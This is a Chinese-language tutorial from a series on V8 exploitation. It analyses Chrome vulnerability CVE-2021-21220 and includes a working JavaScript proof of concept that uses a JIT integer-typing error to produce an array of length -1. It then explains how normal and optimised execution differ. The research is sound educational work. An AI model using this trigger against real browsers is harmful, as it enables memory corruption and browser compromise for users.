**作者：Hcamael@知道创宇404实验室  
时间：2022年02月21日**  
**相关阅读：  
[从 0 开始学 V8 漏洞利用之环境搭建（一）](https://paper.seebug.org/1820/ "从 0 开始学 V8
漏洞利用之环境搭建（一）")  
[从 0 开始学 V8 漏洞利用之 V8 通用利用链（二）](https://paper.seebug.org/1821/ "从 0 开始学 V8
漏洞利用之 V8 通用利用链（二）")  
[从 0 开始学 V8 漏洞利用之 starctf 2019 OOB（三）](https://paper.seebug.org/1822/ "从 0 开始学
V8 漏洞利用之 starctf 2019 OOB（三）")  
[从 0 开始学 V8 漏洞利用之 CVE-2020-6507（四）](https://paper.seebug.org/1823/ "从 0 开始学 V8
漏洞利用之 CVE-2020-6507（四）")  
[从0开始学 V8 漏洞利用之 CVE-2021-30632（五）](https://paper.seebug.org/1824/ "从0开始学 V8
漏洞利用之 CVE-2021-30632（五）")  
[从 0 开始学 V8 漏洞利用之 CVE-2021-38001（六）](https://paper.seebug.org/1825/ "从 0 开始学
V8 漏洞利用之 CVE-2021-38001（六）")  
[从 0 开始学 V8 漏洞利用之 CVE-2021-30517（七）](https://paper.seebug.org/1826/ "从 0 开始学
V8 漏洞利用之 CVE-2021-30517（七）")**
第六个研究的是`CVE-2021-21220`，其chrome的bug编号为：[1196683](https://bugs.chromium.org/p/chromium/issues/detail?id=1196683
"1196683")
可以很容易找到其相关信息：
受影响的Chrome最高版本为：`89.0.4389.114` 受影响的V8最高版本为：`8.9.255.24`
并且还附带了[exp](https://bugs.chromium.org/p/chromium/issues/attachmentText?aid=497472
"exp")
# 搭建环境
一键编译相关环境：
    $ ./build.sh 8.9.255.24
# 漏洞分析
因为通过之前的文章，已经对模板套路很熟悉了，所以在之后的文章中，将不会过多讲诉套模板编写exp，而会让重点放在一些之前文章中没有的点上，更着重在漏洞利用技巧这块。
该漏洞的PoC如下：
    const _arr = new Uint32Array([2**31]);
    function foo(a) {
        var x = 1;
        x = (_arr[0] ^ 0) + 1;
        x = Math.abs(x);
        x -= 2147483647;
        x = Math.max(x, 0);
        x -= 1;
        if(x==-1) x = 0;
        var arr = new Array(x);
        arr.shift();
        var cor = [1.1, 1.2, 1.3];
        return [arr, cor];
    }
上述PoC来源于：
因为我认为这个PoC更利于理解该漏洞。
根据我的理解，我做了如下修改：
    var b = new Uint32Array([0x80000000]);
    var trigger_array = [];
    function trigger() {
      var x = 1;
      x = (b[0] ^ 0) + 1; // 0x80000000 + 1
      x = Math.abs(x); // 0x80000001 0x7fffffff
      x -= 0x7fffffff;  // 2 0
      x = Math.max(x, 0); // 2 0
      x -= 1; // 1 -1
      if(x==-1) x = 0; // 1 0
      trigger_array = new Array(x); // 1 0
      trigger_array.shift();
      var da = [1.1, 2.2];
      var ob = [{a: 1,b: 2}];
      return [da, ob];
    }
在正常情况下，该函数的逻辑：
  1. b[0]为uint32类型的变量，其值为0x80000000。
  2. 异或了0以后，变成了int32类型，其值为-2147483648。
  3. 加上1以后，变成了-2147483647，赋值给了x。但是类型会被扩展成int64，因为js的变量是弱类型，如果x一开始的类型是int32，值为2147483647(0x7fffffff)，那么x+1不会变成-1，而会变成。2147483648(0x80000000)，因为int32被扩展成了int64。
  4. 然后使用math.abs函数计算绝对值，x值变为2147483647(0x7fffffff)。
  5. x - 0x7FFFFFFF = 0。
  6. 使用math.max函数计算x与0之间的最大值，为0。
  7. x - 1 = -1。
  8. 因为x=-1，所以x改为0。
  9. 新建了一个长度为0的数组。
  10. 因为长度为0，所以shitf无效，数组不变。
但是上述逻辑，经过JIT优化以后，就不一样了：
  1. b[0]为uint32类型的变量，其值为0x80000000。
  2. 将其转化成int64类型，其值为0x80000000。
  3. 加上1以后，变成了0x80000001。
  4. 然后使用math.abs函数计算绝对值，x值变为0x80000001。
  5. x - 0x7FFFFFFF = 2。
  6. 使用math.max函数计算x与0之间的最大值，为2。
  7. x - 1 = 1。
  8. 新建了一个长度为1的数组。
  9. shitf函数将数组的长度设置为-1，这就让我们得到了长度为-1的数组，通过该数据进行后续利用。